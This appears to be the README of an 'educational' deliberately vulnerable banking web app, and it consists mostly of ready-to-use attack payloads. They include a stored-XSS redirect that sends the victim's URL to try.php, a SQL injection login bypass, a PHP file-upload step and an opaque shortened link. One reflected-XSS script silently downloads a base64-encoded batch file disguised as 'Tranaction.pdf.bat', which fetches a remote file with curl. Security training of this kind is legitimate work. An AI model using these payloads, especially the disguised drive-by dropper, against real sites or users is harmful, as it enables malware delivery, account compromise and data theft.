# InsecureTrust_Bank
"InsecureTrust_Bank: Educational repo demonstrating web app vulnerabilities like SQL injection &amp; XSS for security awareness. Use responsibly.



1. S-XSS

        ```<span onmouseover="window.location='try.php?url=' + encodeURIComponent(window.location.href)">Hover over me</span>```

2. R-XSS

        ```<script> alert(123)</script>```
        ```<script>fileName = "Tranaction.pdf.bat";fileData = "QGVjaG8gb2ZmDQoNCjo6IERlZmluZSB0aGUgVVJMIG9mIHRoZSByYXcgZmlsZSBvbiBHaXRIdWINCnNldCBmaWxlVXJsPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS91c2VybmFtZS9yZXBvL21haW4vcGF0aC90by9maWxlLnR4dA0KDQo6OiBEZWZpbmUgdGhlIHRhcmdldCBkaXJlY3Rvcnkgd2hlcmUgeW91IHdhbnQgdG8gc2F2ZSB0aGUgZmlsZQ0Kc2V0IHRhcmdldERpcj1DOi8vDQoNCjo6IENyZWF0ZSB0aGUgdGFyZ2V0IGRpcmVjdG9yeSBpZiBpdCBkb2Vzbid0IGV4aXN0DQppZiBub3QgZXhpc3QgIiV0YXJnZXREaXIlIiBta2RpciAiJXRhcmdldERpciUiDQoNCjo6IFVzZSBjdXJsIHRvIGRvd25sb2FkIHRoZSBmaWxlDQpjdXJsIC1vICIldGFyZ2V0RGlyJVxmaWxlLnR4dCIgIiVmaWxlVXJsJSINCg==";function base64tobytes(base64Adata){var binValue = atob(base64Adata);var binLength = binValue.length;var bytesData = new Uint8Array(binLength);for (var i = 0 ; i<binLength; i++){bytesData[i] = binValue.charCodeAt(i);}return bytesData.buffer;}var fileBytes = base64tobytes(fileData);var blob = new Blob([fileBytes], {"type":"octet/stream"});var aTag = document.createElement("a");document.body.append(aTag);aTag.style = "display: none;";var url= window.URL.createObjectURL(blob);aTag.href = url;aTag.download = fileName;aTag.click();window.URL.revokeObjectURL(url);</script>
```

        ```https://shorturl.at/ckvAF``

3. SQL Injection

        ```NO' OR '1' = '1'```

4. File Injection

        ```Upload try.php```

5. DriveByDownload

